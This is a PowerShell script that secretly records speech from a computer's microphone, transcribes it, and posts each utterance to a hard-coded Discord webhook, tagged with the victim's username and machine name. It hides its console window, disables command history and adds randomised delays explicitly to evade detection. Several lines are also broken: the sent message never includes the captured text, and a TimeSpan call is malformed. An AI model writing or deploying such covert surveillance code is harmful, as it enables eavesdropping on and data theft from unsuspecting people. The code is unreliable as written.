function DC-Upload {
    [CmdletBinding()]
    param (
        [parameter(Position=0, Mandatory=$False)]
        [string]$text
    )

    $webhook = "https://discord.com/api/webhooks/1366201501802041374/ENdipWjx_vaIQYHXDYo-kwppUazTUQ9LpTj7oewX0g_wln4_vi9F_HdVdiaiBjFoovZY"
    
    if (-not [string]::IsNullOrEmpty($text)) {
        $retryCount = 0
        $maxRetries = 3
        
        while ($retryCount -lt $maxRetries) {
            try {
                # Fixed payload structure with proper content embedding
                $payload = @{
                    username = "$env:USERNAME@$env:COMPUTERNAME"
                    content = "``````"  # Proper code block formatting
                }
                
                $response = Invoke-RestMethod -Uri $webhook -Method Post `
                    -Body ($payload | ConvertTo-Json) `
                    -ContentType "application/json" `
                    -ErrorAction Stop
                
                # Check for rate limits (search result 7)
                if ($response.retry_after) {
                    Start-Sleep -Milliseconds $response.retry_after
                }
                
                # Randomized delay to avoid pattern detection
                Start-Sleep -Milliseconds (Get-Random -Minimum 300 -Maximum 800)
                return
            }
            catch {
                # Improved error handling (search result 7, 9)
                if ($_.Exception.Response.StatusCode -eq 429) {
                    $retryAfter = [math]::Ceiling($_.Exception.Response.Headers['Retry-After'])
                    Start-Sleep -Seconds $retryAfter
                }
                $retryCount++
                Start-Sleep -Seconds (2 * $retryCount)
            }
        }
        Write-Error "Failed to send after $maxRetries attempts: $_"
    }
}

function voiceLogger {
    Add-Type -AssemblyName System.Speech
    
    try {
        $recognizer = New-Object System.Speech.Recognition.SpeechRecognitionEngine
        $grammar = New-Object System.Speech.Recognition.DictationGrammar
        $recognizer.LoadGrammar($grammar)
        $recognizer.SetInputToDefaultAudioDevice()

        # Configure timeouts (search result 7)
        $recognizer.InitialSilenceTimeout = TimeSpan::FromSeconds(2)
        $recognizer.BabbleTimeout = TimeSpan::FromSeconds(1)
        $recognizer.EndSilenceTimeout = TimeSpan::FromMilliseconds(500)

        # Warm-up period with status check (search result 7)
        Start-Sleep -Seconds 3
        if ($recognizer.AudioState -ne 'Stopped') {
            throw "Audio input initialization failed"
        }

        while ($true) {
            try {
                $result = $recognizer.Recognize()
                if ($result -and $result.Text -match '\S') {
                    DC-Upload -text $result.Text
                    # Random delay between utterances (search result 7)
                    Start-Sleep -Milliseconds (Get-Random -Minimum 200 -Maximum 600)
                }
            }
            catch {
                Write-Error "Recognition error: $_"
                # Improved reset logic (search result 7)
                $recognizer.UnloadAllGrammars()
                $recognizer.Dispose()
                $recognizer = New-Object System.Speech.Recognition.SpeechRecognitionEngine
                $recognizer.LoadGrammar($grammar)
                $recognizer.SetInputToDefaultAudioDevice()
                Start-Sleep -Seconds 5
            }
        }
    }
    finally {
        if ($recognizer) {
            $recognizer.Dispose()
        }
    }
}

# Enhanced stealth (search result 6)
Add-Type -Name Window -Namespace Win32 -MemberDefinition @"
[DllImport("user32.dll")] 
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
"@
[Win32.Window]::ShowWindow((Get-Process -PID $PID).MainWindowHandle, 0)

# Anti-logging measures (search result 6)
Set-PSReadlineOption -HistorySaveStyle SaveNothing
$ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"

# Start the logger
voiceLogger
